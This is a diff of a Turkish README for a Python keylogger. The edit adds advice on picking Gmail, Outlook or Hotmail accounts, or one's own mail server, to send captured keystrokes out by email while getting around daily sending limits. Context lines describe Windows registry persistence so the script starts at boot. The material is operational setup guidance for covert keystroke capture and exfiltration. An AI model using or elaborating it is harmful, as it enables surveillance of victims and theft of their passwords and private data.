@@ -15,7 +15,7 @@ Bu Python script'i, bilgisayarınızdaki tuş vuruşlarını kaydeden ve belirli
      ```
 
 2. **E-posta Ayarları**:
-   - Script, e-posta göndermek için bir Gmail hesabı kullanmaktadır. E-posta gönderme işlevselliği için Gmail SMTP sunucusuna bağlanır. E-posta ve şifre bilgilerinizi `send_email` fonksiyonunda belirtmeniz gerekmektedir.
+   - Script, e-posta göndermek için bir Gmail, Outlook, Hotmal hesaplarından birisini kuıllanabilirsiniz fakat bu servislerin günlük E-posta gönderme limiti bulunmaktadır. Kendinize ait bir Mail sunucunuz olur ise daha sağlıklı olabilir. E-posta gönderme işlevselliği için Gmail SMTP sunucusuna bağlanır. E-posta ve şifre bilgilerinizi `send_email` fonksiyonunda belirtmeniz gerekmektedir.
 
 3. **Persistence (Kalıcılık) Ekleme**:
    - `add_to_registry` fonksiyonu, script'i Windows kayıt defterine ekleyerek bilgisayar başlatıldığında otomatik olarak çalışmasını sağlar.
